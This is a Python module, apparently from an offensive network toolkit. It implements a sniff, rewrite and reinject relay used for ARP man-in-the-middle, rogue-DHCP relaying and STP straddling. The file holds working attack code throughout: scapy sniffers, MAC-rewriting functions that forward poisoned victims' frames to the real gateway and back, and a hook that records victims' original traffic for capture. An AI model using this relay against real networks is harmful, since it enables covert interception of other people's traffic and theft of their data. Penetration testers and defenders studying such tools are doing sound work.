"""Session-scoped receive-and-reinject relay lifecycle.

Peer of :mod:`~mac_and_seize.net.session` but for a *paired* pipeline instead
of a plain packet store: every :class:`RelaySession` owns one or more
:class:`~scapy.sendrecv.AsyncSniffer` s (one per :class:`RelayFlow`), applies
each flow's ``rewrite_fn`` to each incoming frame, and reinjects the result on
the flow's egress interface via
:func:`~mac_and_seize.net.adapters.scapy_io.send_l2`.

Because more than one module needs this shape (the ARP MiTM, the rogue-DHCP
one-way relay, the STP straddle, and any future wireless/VLAN case), it lives
in the shared ``net/`` layer below the modules, exactly like
:mod:`~mac_and_seize.net.session` sits below the capture modules
(see ``modules/README.md`` §8).

Design notes
------------
* **Subscriber fan-out.**
  :meth:`RelaySession.set_subscriber_hook` installs a callable that fires for
  every relayed frame *pre-rewrite* so a subscriber (the capture module)
  records what the victim actually sent. The hook is called only when set, so
  a session with no subscriber costs nothing extra per frame.
* **Self-echo suppression.**
  Any frame whose Ethernet source is our own MAC is dropped in the handler.
  The BPF should already exclude it (``not ether src <us>``) but a second
  guard costs nothing and matches the ``client_macs`` check in
  :mod:`~mac_and_seize.modules.lan.dhcp.service`.
* **Self-death.**
  A small monitor thread polls two failure modes and calls a caller-supplied
  ``on_death`` callback, mirroring the ``presenter.notify`` path in
  :meth:`~mac_and_seize.modules.lan.arp.service.ArpSpoofService._finalize`:

  - The sniffer thread exited on its own (interface vanished / socket died);
  - Consecutive send failures crossed :data:`_MAX_CONSECUTIVE_FAILURES`.
"""

from __future__ import annotations

import threading
import time
from dataclasses import dataclass, field
from typing import Any, Callable

from scapy.layers.inet import IP
from scapy.layers.l2 import Ether

from mac_and_seize.net.adapters import scapy_io
from mac_and_seize.observability import get_logger

#: How many consecutive send failures end a relay session on its own (e.g. the
#: egress interface went down) rather than logging forever.
_MAX_CONSECUTIVE_FAILURES = 40

#: How often the monitor checks for a dead sniffer / a failure streak. Fast
#: enough that a broken relay is caught within a second, slow enough that the
#: idle cost of a healthy relay is negligible.
_MONITOR_INTERVAL_S = 1.0


@dataclass
class RelayFlow:
    """One directed pipe the :class:`RelaySession` maintains.

    Frames that match ``bpf`` on ``iface_in`` are passed to ``rewrite_fn``;
    the result (or the original frame if ``rewrite_fn`` is ``None``) is
    reinjected on ``iface_out``. Returning ``None`` from ``rewrite_fn`` drops
    the frame.

    ``label`` names the flow for logs and the ``relay list`` view.
    """

    label: str
    iface_in: str
    iface_out: str
    bpf: str
    rewrite_fn: Callable[[Any], Any] | None = None


@dataclass
class RelayMetrics:
    """Running counters for one :class:`RelaySession`."""

    forwarded: int = 0
    send_failures: int = 0
    started_at: float = field(default_factory=time.monotonic)


class RelaySession:
    """One relay handle: one or two paired sniff+inject pipes on a shared MAC.

    Sniffing and injection both need root; callers gate root-only actions
    upstream (the CLI does this via ``requires_root=True`` on the attack
    module's action).
    """

    def __init__(
        self,
        *,
        kind: str,
        label: str,
        our_mac: str,
        flows: list[RelayFlow],
    ) -> None:
        self._log = get_logger(__name__)
        self.kind = kind
        self.label = label
        self._our_mac = our_mac.lower()
        self._flows = list(flows)
        self._sniffers: list[Any] = []
        self._subscriber_hook: Callable[[Any], None] | None = None
        self._lock = threading.RLock()
        self._stopped = False
        self._monitor: threading.Thread | None = None
        self._monitor_stop = threading.Event()
        self._on_death: Callable[["RelaySession", str], None] | None = None
        self.metrics = RelayMetrics()

    # --- Public API -----------------------------------------------------------

    def set_subscriber_hook(
        self, hook: Callable[[Any], None] | None
    ) -> None:
        """Install (or remove) the fan-out hook called for every relayed frame.

        The hook is invoked from the sniffer's own thread with the *original*
        (pre-rewrite) frame so a subscriber sees what the victim actually
        sent. Passing ``None`` clears it.
        """
        with self._lock:
            self._subscriber_hook = hook

    def set_death_callback(
        self, callback: Callable[["RelaySession", str], None] | None
    ) -> None:
        """Register the callback fired on self-death (see :class:`RelaySession`)."""
        with self._lock:
            self._on_death = callback

    def begin(self) -> None:
        """Start sniffing on every flow and spin up the monitor thread.

        All-or-nothing: if any sniffer fails to open, the ones already opened
        are torn back down before the exception propagates - so a failed
        start never leaves half a session behind.
        """
        started: list[Any] = []
        try:
            scapy_io.refresh_interfaces()
            for flow in self._flows:
                sniffer = scapy_io.dispatch_sniffer(
                    flow.iface_in,
                    lambda pkt, f=flow: self._on_packet(f, pkt),
                    bpf_filter=flow.bpf,
                    # Every relay reinjects frames the sniffer would otherwise
                    # see again (either the same iface for ARP/DHCP-scapy, or
                    # a straddled peer iface); switch to L2Socket so the recv
                    # path drops PACKET_OUTGOING. For rewriters that mutate
                    # dst-MAC this is defence-in-depth; for the STP straddle
                    # (verbatim forward) it is what prevents an echo loop.
                    ignore_outgoing=True,
                )
                sniffer.start()
                started.append(sniffer)
        except Exception:
            for sniffer in started:
                self._stop_one_sniffer(sniffer)
            raise
        with self._lock:
            self._sniffers = started
            self._monitor = threading.Thread(
                target=self._monitor_loop,
                name=f"relay-monitor-{self.kind}-{self.label}",
                daemon=True,
            )
        self._monitor.start()
        self._log.info(
            "Relay %s (%s) started with %d flow(s)",
            self.kind, self.label, len(self._flows),
        )

    def end(self) -> None:
        """Stop every sniffer and the monitor. Idempotent."""
        with self._lock:
            if self._stopped:
                return
            self._stopped = True
            sniffers = list(self._sniffers)
            self._sniffers = []
        self._monitor_stop.set()
        for sniffer in sniffers:
            self._stop_one_sniffer(sniffer)
        monitor = self._monitor
        if (
            monitor is not None
            and monitor.is_alive()
            and monitor is not threading.current_thread()
        ):
            monitor.join(timeout=_MONITOR_INTERVAL_S * 2)
        self._log.info(
            "Relay %s (%s) stopped (%d frame(s) forwarded, %d send failure(s))",
            self.kind, self.label,
            self.metrics.forwarded, self.metrics.send_failures,
        )

    def runtime_seconds(self) -> float:
        return max(0.0, time.monotonic() - self.metrics.started_at)

    # --- Sniffer callback ------------------------------------------------------

    def _on_packet(self, flow: RelayFlow, pkt) -> None:
        """Sniffer callback: rewrite, reinject, and fan out. Runs on the sniffer thread.

        Must not raise: an exception here would tear down the sniffer thread
        and leave the session dead without notice. Any error is logged; the
        loop continues.
        """
        try:
            if not pkt.haslayer(Ether):
                return
            eth = pkt[Ether]
            src = (str(eth.src) or "").lower()
            if src == self._our_mac:
                # Self-echo: our own reinjection came back through the sniff
                # path. Drop.
                return
            outgoing = flow.rewrite_fn(pkt) if flow.rewrite_fn else pkt
            if outgoing is None:
                return
            try:
                scapy_io.send_l2(outgoing, flow.iface_out)
                with self._lock:
                    self.metrics.forwarded += 1
                    # Reset the failure streak on any successful send.
                    self.metrics.send_failures = 0
            except OSError as exc:
                with self._lock:
                    self.metrics.send_failures += 1
                self._log.debug(
                    "Relay %s (%s): send on %s failed: %s",
                    self.kind, self.label, flow.iface_out, exc,
                )
            hook = self._subscriber_hook
            if hook is not None:
                try:
                    hook(pkt)
                except Exception:  # noqa: BLE001 - subscriber errors must not kill the relay
                    self._log.debug(
                        "Relay %s (%s): subscriber hook raised",
                        self.kind, self.label, exc_info=True,
                    )
        except Exception:  # noqa: BLE001 - a bad frame must not stop the sniffer
            self._log.exception(
                "Relay %s (%s): handler crashed on %s",
                self.kind, self.label, flow.iface_in,
            )

    # --- Monitor -------------------------------------------------------------

    def _monitor_loop(self) -> None:
        """Watch for a dead sniffer / send-failure streak; fire ``on_death``."""
        while not self._monitor_stop.wait(_MONITOR_INTERVAL_S):
            with self._lock:
                if self._stopped:
                    return
                sniffers = list(self._sniffers)
                failures = self.metrics.send_failures
            dead_sniffer = any(
                not getattr(s, "running", False) for s in sniffers
            )
            if dead_sniffer:
                self._trigger_death("sniffer stopped (interface may have gone away)")
                return
            if failures >= _MAX_CONSECUTIVE_FAILURES:
                self._trigger_death(
                    f"{failures} consecutive send failure(s)"
                )
                return

    def _trigger_death(self, reason: str) -> None:
        """Fire the ``on_death`` callback exactly once."""
        with self._lock:
            if self._stopped:
                return
            callback = self._on_death
        if callback is None:
            self._log.warning(
                "Relay %s (%s) died with no death callback set: %s",
                self.kind, self.label, reason,
            )
            self.end()
            return
        try:
            callback(self, reason)
        except Exception:  # noqa: BLE001 - death handler must not crash the monitor
            self._log.exception(
                "Relay %s (%s): death callback raised",
                self.kind, self.label,
            )

    # --- Helpers -------------------------------------------------------------

    def _stop_one_sniffer(self, sniffer) -> None:
        try:
            if getattr(sniffer, "running", False):
                sniffer.stop()
        except Exception:  # noqa: BLE001 - teardown must not raise at the prompt
            self._log.debug(
                "Relay: sniffer stop failed", exc_info=True
            )


# --- Rewriter factories -----------------------------------------------------
#
# Modules build a RelayFlow by supplying a ``rewrite_fn``. The three primitives
# used in v1 are captured here so the attack modules never open Ether by hand
# and every rewrite has the same shape (dst-MAC only; src-MAC preserved to
# keep switch CAM learning intact - see the "preserving switch learning"
# invariant in the plan).


def rewrite_dst_mac(new_dst_mac: str) -> Callable[[Any], Any]:
    """Return a rewriter that unconditionally rewrites the frame's dst-MAC.

    Used for a fixed-target flow (rogue-DHCP one-way relay: every victim
    frame goes to the real upstream router's MAC).
    """
    dst = new_dst_mac.lower()

    def rewrite(pkt):
        if not pkt.haslayer(Ether):
            return None
        pkt[Ether].dst = dst
        return pkt

    return rewrite


def rewrite_arp_mitm(
    spoofed_mac: str,
    victim_ip_to_mac: dict[str, str],
) -> Callable[[Any], Any]:
    """Return a bidirectional rewriter for the ARP MiTM case.

    Forward direction: a frame whose Ethernet source is any of the poisoned
    victims (``victim_ip_to_mac.values()``) gets its dst-MAC rewritten to
    ``spoofed_mac`` (the real MAC of the address we impersonated in the
    victims' caches).

    Reverse direction: a frame whose Ethernet source is ``spoofed_mac`` (the
    real gateway, if the operator has separately poisoned the *gateway's*
    ARP cache to redirect the victim's IP through us) gets its dst-MAC
    rewritten to the correct victim's real MAC based on the IP destination
    - which is the only field that unambiguously identifies which of many
    poisoned victims the frame is for.

    Frames that match neither direction are dropped (returning ``None``).
    """
    spoofed = spoofed_mac.lower()
    victim_macs = {mac.lower() for mac in victim_ip_to_mac.values()}
    ip_to_mac = {ip: mac.lower() for ip, mac in victim_ip_to_mac.items()}

    def rewrite(pkt):
        if not pkt.haslayer(Ether):
            return None
        eth = pkt[Ether]
        src = (str(eth.src) or "").lower()
        if src in victim_macs:
            # Forward: victim -> spoofed peer
            eth.dst = spoofed
            return pkt
        if src == spoofed:
            # Reverse: spoofed peer -> some victim; pick by IP dst.
            if not pkt.haslayer(IP):
                return None
            dst_ip = str(pkt[IP].dst)
            peer = ip_to_mac.get(dst_ip)
            if peer is None:
                return None
            eth.dst = peer
            return pkt
        return None

    return rewrite


